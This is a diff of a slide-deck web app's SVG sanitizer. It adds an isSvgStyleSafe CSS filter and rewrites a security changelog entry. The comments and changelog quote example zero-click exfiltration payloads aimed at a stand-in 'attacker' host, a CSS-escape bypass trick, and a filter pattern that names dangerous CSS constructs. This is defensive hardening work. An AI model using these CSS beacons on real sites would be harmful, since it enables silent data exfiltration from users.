@@ -71,7 +71,7 @@ const velaClipboardReadSlide = async () => {
 
 const VELA_VERSION = "12.51";
 const VELA_CHANGELOG = [
-  { v: "12.51", d: "Security (audit 2026-06, Medium): block <style> and <link> in SVG_BLOCKED_TAGS. The SVG sanitizer's element-only attribute walk did not strip these tags, so a deck-supplied SVG block could ship `<style>* { background: url('https://attacker/?d=...') }</style>` or `<style>@import url('https://attacker/')</style>` and fire an outbound CSS-driven GET on every render — zero-click data-exfil beacon, no CSP backstop inside the artifact srcdoc. SAFE_STYLE_KEYS only filters the `style=\"...\"` inline attribute; CSS text inside <style> elements bypassed it entirely. Same vector via `<link rel='stylesheet' href='...'>`. Static presentation diagrams style via inline attributes and theme-token replacement, so dropping the tags has no legitimate-deck impact. Confirmed no existing Vela example deck uses SVG <style>." },
+  { v: "12.51", d: "Security (audit 2026-06, Low/defense-in-depth): close CSS-text exfil channel inside SVG. Before: <style> CSS text and <link rel=stylesheet> passed the element-only walk untouched, so `<style>* { background: url('https://attacker/?d=...') }</style>` (or @import) fired an outbound GET on render — zero-click beacon, no CSP backstop inside the artifact srcdoc. Not XSS (no script execution, sandboxed iframe), but still a confirmable render beacon and a slow CSS-attribute-exfil primitive. SAFE_STYLE_KEYS only covers `style=\"...\"` inline attributes. Fix: (1) <link> goes into SVG_BLOCKED_TAGS outright (no legitimate inline-SVG use). (2) <style> stays — Mermaid/draw.io/Vera-generated diagrams legitimately use inner CSS for class-driven styling and url(#fragment) paint-server/marker/gradient refs — but its textContent is filtered by isSvgStyleSafe(): reject @import, expression(), behavior:, -moz-binding, any backslash (CSS \XX escapes can decode 'url'/'@import' past a literal-token check), and any url() that isn't a same-document #fragment ref. Preserves legitimate class-based SVG styling; kills the exfil." },
   { v: "12.50", d: "Security (audit 2025-05 — Critical/High hardening): (H1) LOAD_LANES reducer now re-sanitizes every slide via sanitizeSlide — Vera's 20-tool ReAct writes (set_slides/add_slide/edit_slide) round-trip through LOAD_LANES, the only ingest path that previously skipped sanitization. (H2) New sanitizeStyle() + SAFE_STYLE_KEYS allowlist: block.style and item.style were typecheck-only, allowing `backgroundImage: url('https://attacker/?d=...')` as a zero-click CSS exfil channel with no CSP backstop inside the artifact srcdoc. Allowlist excludes image-loading keys (background, backgroundImage, borderImage, listStyleImage, cursor, content, mask, filter, font shorthand) and rejects any value containing url()/expression()/image-set()/CSS-escape/angle-bracket even when the key is allowlisted. (H5) ReAct loop now caps tool_calls/turn (16), session-total tools (40), and cumulative messages payload (200 KB) to prevent prompt-injection cost-amplification DoS." },
   { v: "12.49", d: "Tests: complete XSS/deck-load regression coverage. Added 10 CI-gating source assertions (SVG_BLOCKED_TAGS + SMIL family, CDATA/comment node strip, control-char scheme normalization, lane clamp-not-throw, fail-closed deck-load fallbacks, IMPORT_CONCEPTS sanitizeSlide, openExternalLink sink + no raw window.open of deck links, item-level link sanitization) and new in-browser uitest cases (entity-encoded javascript: schemes, tag reconstruction, unclosed iframe/embed/script/foreignObject, vbscript via xlink:href, and a Deck Sanitization suite covering >50-lane clamp + non-whitelisted block drop)." },
   { v: "12.48", d: "Security (defense-in-depth): block the full SMIL animation family in SVG_BLOCKED_TAGS — added animateTransform, animateMotion, animateColor and mpath alongside the existing animate/set. Their on* event handlers were already stripped (so they were inert, not exploitable), but removing the elements outright eliminates any residual SMIL animation surface (e.g. animating an attribute toward a dangerous value) and matches the treatment of <animate>. Static presentation diagrams don't use SMIL." },
@@ -348,14 +348,29 @@ function openExternalLink(url) {
   if (safe) window.open(safe, "_blank", "noopener,noreferrer");
 }
 
-// SECURITY: `style` and `link` permit CSS-based zero-click exfil even with all
-// scripts stripped. <style>* { background: url("https://attacker/?d=...") }</style>
-// (or @import url(...)) inside an SVG fires an outbound GET on render with no
-// CSP backstop inside the artifact srcdoc; SAFE_STYLE_KEYS only filters inline
-// `style="..."` attributes, not <style> element CSS text. <link rel="stylesheet">
-// is the same channel. Static presentation diagrams don't use either — Vela
-// styles SVG via inline attributes and theme-token substitution.
-const SVG_BLOCKED_TAGS = new Set(["script", "foreignobject", "iframe", "embed", "object", "use", "animate", "animatetransform", "animatemotion", "animatecolor", "mpath", "set", "handler", "listener", "style", "link"]);
+// SECURITY: <link> is a pure stylesheet loader with no legitimate inline-SVG
+// use, so it's blocked outright. <style> is kept (Mermaid, draw.io, Vera-
+// generated diagrams all rely on inner CSS for class-driven styling) but its
+// CSS text is filtered for zero-click exfil constructs — see isSvgStyleSafe.
+const SVG_BLOCKED_TAGS = new Set(["script", "foreignobject", "iframe", "embed", "object", "use", "animate", "animatetransform", "animatemotion", "animatecolor", "mpath", "set", "handler", "listener", "link"]);
+
+// SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
+// attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
+// render — zero-click exfil beacon with no CSP backstop inside the artifact
+// srcdoc. SAFE_STYLE_KEYS only filters the style="..." inline attribute, not
+// <style>-element CSS text. We allow url(#fragment) (SVG paint servers,
+// markers, gradients, clip-paths) and reject everything else that can hit
+// the network or use legacy code-execution constructs. CSS \XX escape
+// sequences can decode "url" / "@import" past a literal-token regex
+// (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
+function isSvgStyleSafe(css) {
+  if (typeof css !== "string" || css.length > 5000) return false;
+  if (css.indexOf("\\") !== -1) return false;
+  if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
+  const urls = css.match(/url\s*\([^)]*\)/gi);
+  if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
+  return true;
+}
 
 function sanitizeSvgMarkup(raw) {
   if (typeof raw !== "string") return "";
@@ -374,6 +389,11 @@ function sanitizeSvgMarkup(raw) {
         if (child.nodeType === 1) {
           const tag = child.localName.toLowerCase();
           if (SVG_BLOCKED_TAGS.has(tag)) { child.remove(); continue; }
+          if (tag === "style") {
+            if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
+            // CSS text is safe — skip attribute walk (no on*/href/etc. on <style>) and don't descend.
+            continue;
+          }
           const attrs = Array.from(child.attributes);
           for (const a of attrs) {
             const name = a.name.toLowerCase();
